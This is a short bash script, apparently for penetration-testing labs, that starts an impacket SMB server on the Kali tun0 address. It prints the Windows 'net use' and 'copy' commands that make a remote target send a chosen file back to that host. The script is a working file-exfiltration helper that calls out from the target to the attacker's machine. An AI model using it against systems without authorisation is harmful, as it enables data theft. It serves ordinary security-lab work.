#!/bin/bash

# Define color codes ${PINK} for PINK and ${NC} to NC
PINK='\033[38;2;255;105;180m'  # Pink RGB color
NC='\033[0m'                   # No Color (NC)

# Ensure the script is run with root privileges
if [ "$(id -u)" -ne "0" ]; then
    echo "This script requires root privileges. Please run with sudo."
    exit 1
fi

# Prompt for username and password
read -p "Enter SMB username: " smb_user
read -sp "Enter SMB password: " smb_pass
echo

# Set the kaliIP variable to your tun0 IP address
kaliIP=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$kaliIP" ]; then
    echo "Could not determine tun0 IP address. Please check your network configuration."
    exit 1
fi

# Print the command to be run on the remote machine
echo "The following command should be run on the remote machine:"
echo -e "${PINK}net use \\\\\\\\$kaliIP\\\\share /user:$smb_user $smb_pass${NC}"

# Prompt for the file path on the remote machine
read -p "Enter the path to the file you want to copy: " file_path

# Print the command to copy the file
echo "To copy the file, run the following command on the remote machine:"
echo -e "${PINK}copy $file_path \\\\\\\\$kaliIP\\\\share${NC}"

# Run the impacket-smbserver command
echo "Starting SMB server with username '$smb_user' and password '****' (password is hidden for security reasons)."
sudo impacket-smbserver -smb2support share . -username "$smb_user" -password "$smb_pass" &
